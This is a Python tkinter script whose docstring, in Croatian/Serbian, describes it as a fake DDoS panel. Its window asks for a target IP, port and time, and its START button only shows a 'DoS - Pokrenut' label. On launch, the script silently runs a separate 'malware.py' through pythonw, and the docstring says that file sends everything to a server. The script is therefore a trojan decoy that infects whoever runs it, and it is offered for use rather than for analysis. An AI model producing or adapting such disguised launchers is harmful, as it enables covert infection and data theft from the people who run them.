"""
LAŽNI DDOS PANEL, NAKON POKRETANJA start.py 
POKREĆE SE MALWARE KOJI ŠALJE SVE NA SERVER
"""

import os
from tkinter import*

def start_dos():
    naslov = Label(root ,
               bg = "white",
               text = "DoS - Pokrenut",
               fg = "green",
               font = (
                        "arial",
                        14,
                        "bold"
                )).place(x = 75, y = 350)

def start():
    os.system("pythonw malware.py")
start()

root = Tk()
root.title("Materija - Made by Krkan")
root.config(bg = "white")
root.geometry("300x400")
root.resizable(False , False)

naslov = Label(root ,
               bg = "white",
               text = "MATERIJA",
               fg = "black",
               font = (
                        "arial",
                        22,
                        "bold"
                )).pack()

razmak_veci = Label(root, text = " ", bg = "white", padx = 10, pady = 10).pack()

h1_ip = Label(root, text = "Unesi IP: ", bg = "white", fg = "black", font = ("consolas",11,"bold")).pack()
ip_unos = Entry(root)
ip_unos.insert(0,"127.0.0.1")
ip_unos.pack()
razmak_manji = Label(root, text = " ", bg = "white", padx = 5, pady = 5).pack()
h1_port = Label(root, text = "Unesi PORT: ", bg = "white", fg = "black", font = ("consolas",11,"bold")).pack()
port_unos = Entry(root)
port_unos.insert(0,"8080")
port_unos.pack()
razmak_manji = Label(root, text = " ", bg = "white", padx = 5, pady = 5).pack()
h1_time = Label(root, text = "Unesi TIME: ", bg = "white", fg = "black", font = ("consolas",11,"bold")).pack()
time_unos = Entry()
time_unos.insert(0,"300")
time_unos.pack()
razmak_manji = Label(root, text = " ", bg = "white", padx = 7, pady = 7).pack()

dos_btn = Button(root,
                text = "START",
                bg = "gray",
                fg = "black",
                width = 13,
                command = start_dos,
                font = (
                    "roboto",
                    12,
                    "bold"
                )).pack()


root.mainloop()
